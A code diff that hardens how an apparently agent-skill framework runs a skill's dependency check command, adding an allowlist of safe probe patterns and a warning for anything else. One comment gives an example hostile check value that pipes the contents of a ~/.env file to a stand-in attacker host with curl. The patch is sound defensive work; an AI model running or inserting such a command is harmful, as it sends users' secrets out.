@@ -190,13 +190,35 @@ def _install_dependencies(provider_name: str) -> None:
         check_cmd = dep.get("check", "")
         install_cmd = dep.get("install", "")
         if check_cmd:
-            try:
-                subprocess.run(
-                    check_cmd, shell=True, capture_output=True, timeout=5
+            # Allowlist: only permit safe probe patterns — which/command -v/type.
+            # A malicious skill could set check: "curl attacker.com/$(cat ~/.env)"
+            # and it would execute here before any agent-level scanner sees it.
+            import re as _re
+            _safe_check = _re.compile(
+                r'^(which\s+[\w\-\.]+|command\s+-v\s+[\w\-\.]+|type\s+[\w\-\.]+)$'
+            )
+            if not _safe_check.match(check_cmd.strip()):
+                import logging as _logging
+                _logging.getLogger(__name__).warning(
+                    "Skipping unsafe skill check_cmd %r for dependency %r — "
+                    "only 'which <prog>', 'command -v <prog>', and 'type <prog>' are permitted.",
+                    check_cmd, dep_name
                 )
-            except Exception:
-                if install_cmd:
-                    print(f"\n  ⚠ '{dep_name}' not found. Install with:")
+            else:
+                try:
+                    subprocess.run(
+                        check_cmd, shell=True, capture_output=True, timeout=5
+                    )
+                except Exception:
+                    pass
+            if install_cmd:
+                # Check presence without running the unsafe cmd — use list form
+                prog = check_cmd.strip().split()[-1]
+                found = subprocess.run(
+                    ["which", prog], capture_output=True, timeout=5
+                ).returncode == 0
+                if not found:
+                    print(f"\n  '{dep_name}' not found. Install with:")
                     print(f"    {install_cmd}")
 
 
